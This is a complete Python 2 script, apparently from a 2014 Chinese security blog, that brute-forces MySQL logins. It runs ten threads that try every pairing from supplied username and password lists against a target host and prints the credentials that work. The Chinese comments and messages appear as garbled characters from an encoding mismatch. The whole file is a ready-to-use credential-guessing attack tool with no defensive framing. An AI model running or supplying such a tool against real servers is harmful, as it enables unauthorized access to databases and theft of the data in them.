#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2014/11/12
# Created by ���Եȴ�
# ���� http://www.waitalone.cn/
import os, sys, re, socket, time
from functools import partial
from multiprocessing.dummy import Pool as ThreadPool

try:
    import MySQLdb
except ImportError:
    print '\n[!] MySQLdbģ�鵼�����,�뵽������ַ���أ�'
    print '[!] http://www.codegood.com/archives/129'
    exit()


def usage():
    print '+' + '-' * 50 + '+'
    print '\t   Python MySQL�����ƽ⹤�߶��̰߳�'
    print '\t   Blog��http://www.waitalone.cn/'
    print '\t\t Code BY�� ���Եȴ�'
    print '\t\t Time��2014-11-12'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 6:
        print "�÷�: " + os.path.basename(sys.argv[0]) + " ���ƽ��ip/domain �˿� ���ݿ� �û����б� �����б�"
        print "ʵ��: " + os.path.basename(sys.argv[0]) + " www.waitalone.cn  3306  test user.txt pass.txt"
        sys.exit()


def mysql_brute(user, password):
    "mysql���ݿ��ƽ⺯��"
    db = None
    try:
        # print "user:", user, "password:", password
        db = MySQLdb.connect(host=host, user=user, passwd=password, db=sys.argv[3], port=int(sys.argv[2]))
        # print '[+] �ƽ�ɹ���', user, password
        result.append('�û�����' + user + "\t���룺" + password)
    except KeyboardInterrupt:
        print '��ү,�����ķԸ�,�ѳɹ��˳�����!'
        exit()
    except MySQLdb.Error, msg:
        # print 'δ֪�����ү:', msg
        pass
    finally:
        if db:
            db.close()


if __name__ == '__main__':
    usage()
    start_time = time.time()
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
        host = sys.argv[1]
    else:
        host = socket.gethostbyname(sys.argv[1])
    userlist = [i.rstrip() for i in open(sys.argv[4])]
    passlist = [j.rstrip() for j in open(sys.argv[5])]
    print '\n[+] Ŀ  �꣺%s \n' % sys.argv[1]
    print '[+] �û�����%d ��\n' % len(userlist)
    print '[+] ��  �룺%d ��\n' % len(passlist)
    print '[!] �����ƽ���,���Ժ򡭡�\n'
    result = []

    for user in userlist:
        partial_user = partial(mysql_brute, user)
        pool = ThreadPool(10)
        pool.map(partial_user, passlist)
        pool.close()
        pool.join()
    if len(result) != 0:
        print '[+] ��ϲ��ү,MySQL�����ƽ�ɹ�!\n'
        for x in {}.fromkeys(result).keys():
            print x + '\n'
    else:
        print '[-] �����˴�ү,MySQL�����ƽ�ʧ��!\n'
    print '[+] �ƽ���ɣ���ʱ�� %d ��' % (time.time() - start_time)
